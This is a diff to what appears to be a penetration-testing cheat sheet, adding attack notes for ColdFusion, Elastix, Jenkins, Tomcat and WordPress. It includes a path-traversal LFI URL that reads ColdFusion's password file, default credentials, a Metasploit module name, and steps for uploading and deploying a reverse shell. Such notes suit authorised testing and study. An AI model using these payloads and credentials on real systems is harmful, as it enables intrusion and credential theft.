@@ -47,15 +47,35 @@ Other Tools:
     Feroxbuster	
 	
 # Web app specific  
-    
-Jenkins: [pwn jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins)  
+### Adobe Coldfusion 
+https://nets.ec/Coldfusion_hacking
+https://www.drchaos.com/post/a-walk-down-adversary-lane-coldfusion-v8
 
-Tomcat (usually port 8080, /manager) 
+    Metasploit - Determine version
+    /CFIDE/adminapi/base.cfc?wsdl
+    Version 8 Vulnerabilities
+    Fckeditor: use exploit/windows/http/coldfusion_fckeditor
 
+LFI - http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+
+### Elastix 
+
+    default login are admin:admin at /vtigercrm/
+    able to upload shell in profile-photo
+    Examine configuration files - Generic
+    Examine httpd.conf/ windows config files
+
+### Jenkins
+[pwn jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins)  
+
+### Tomcat 
+
+    Usually port 8080, /manager
     default creds tomcat:s3cret
-    generate war reverse shell, upload and deploy 
+    generate war reverse shell payload, upload and deploy 
     
-Wordpress: wpscan 
+### Wordpress
+wpscan 
 
     wpscan --url <domain>
     wpscan --url <domain> --enumerate ap at (All Plugins, All Themes)
